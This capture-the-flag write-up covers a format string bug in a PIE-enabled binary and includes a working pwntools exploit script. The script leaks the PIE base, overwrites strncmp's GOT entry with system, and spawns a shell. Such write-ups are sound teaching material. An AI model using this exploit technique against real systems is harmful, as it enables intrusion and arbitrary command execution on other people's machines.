# Format Pie Challenge Writeup

## Challenge Description
**Name:** Format Pie
**Category:** Pwn
**Objective:** Exploit a format string vulnerability in a PIE-enabled binary to gain a shell.

## Initial Analysis
We are provided with a binary `format_pie`. Running `checksec` reveals:
- **Arch:** amd64-64-little
- **RELRO:** Partial RELRO (GOT is writable)
- **Stack:** Canary found
- **NX:** NX enabled
- **PIE:** PIE enabled (Addresses are randomized)

Decompiling the binary (or analyzing the source if provided later) shows a clear format string vulnerability in the `vuln` function:

```c
void vuln() {
    char buffer[256];
    while(1) {
        printf("> ");
        if (fgets(buffer, sizeof(buffer), stdin) == NULL) break;
        printf(buffer); // VULNERABILITY: Format String
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }
    }
}
```

The program loops, reads input into a buffer, and prints it directly using `printf(buffer)`. This allows us to leak addresses and write to memory.

## Exploitation Strategy

Since PIE is enabled, we don't know the absolute addresses of functions or the GOT. However, we can use the format string vulnerability to leak an address from the stack that points into the binary's code segment.

### Step 1: Leak PIE Base
1.  Fuzz the format string offsets (e.g., `%p %p ...` or `%1$p`, `%2$p`) to find a value on the stack that looks like a code address (starts with `0x5...` or similar range).
2.  In this binary, offset **41** (`%41$p`) typically contains a return address pointing back to `main`.
3.  Calculate the offset of this leaked address relative to the binary's base.
    *   Run the binary in a debugger (GDB).
    *   `vmmap` to see the base address.
    *   Leak the value at `%41$p`.
    *   `Offset = LeakedValue - BaseAddress`.
4.  In the exploit script, calculate `BaseAddress = LeakedValue - Offset`.

### Step 2: Overwrite GOT
With the PIE base known, we can calculate the address of the Global Offset Table (GOT).
Since `Partial RELRO` is enabled, the GOT is writable.
We target the `strncmp` function because it is called immediately after our `printf`.

1.  **Target:** `strncmp@got`
2.  **Value:** `system@plt` (or the `win` function address if available).
    *   The binary has a `win` function, but it calls `system("/bin/sh")`.
    *   Alternatively, we can overwrite `strncmp` with `system@plt`.
    *   When `strncmp(buffer, "exit", 4)` is called, it becomes `system(buffer)`.
3.  **Payload:** Use `fmtstr_payload` (from pwntools) to generate the format string that writes the address of `system` into `strncmp@got`.

### Step 3: Trigger Shell
1.  Send the payload to overwrite the GOT.
2.  The loop continues.
3.  Send the string `sh` (or `/bin/sh`).
4.  The program calls `strncmp(buffer, ...)` which is now `system("sh")`.
5.  Enjoy the shell!

## Solution Script (`solve.py`)

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./format_pie")
context.binary = exe

# Connect to challenge
# r = remote("target_ip", target_port)
r = process([exe.path])

# Step 1: Leak PIE Base
# %41$p leaks a return address in main
r.sendlineafter(b"> ", b"%41$p")
leak = int(r.recvline().strip(), 16)
log.info(f"Leaked address: {hex(leak)}")

# Calculate base (offset found via debugging)
exe.address = leak - 0x134d 
log.info(f"PIE Base: {hex(exe.address)}")

# Step 2: Overwrite strncmp@got with system@plt
# We want to call system(buffer), so we overwrite strncmp
payload = fmtstr_payload(6, {exe.got['strncmp']: exe.plt['system']})
r.sendlineafter(b"> ", payload)

# Step 3: Trigger shell
r.sendlineafter(b"> ", b"sh")

r.interactive()
```
